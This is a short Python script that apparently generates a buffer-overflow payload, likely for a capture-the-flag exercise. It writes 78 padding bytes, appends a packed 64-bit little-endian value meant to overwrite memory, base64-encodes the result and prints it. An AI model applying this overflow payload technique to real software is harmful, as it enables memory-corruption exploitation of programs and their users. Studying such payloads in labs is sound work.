
import sys
import struct
import base64

buf = b'vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv'
buf += struct.pack('<Q', 3542554531428862643)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
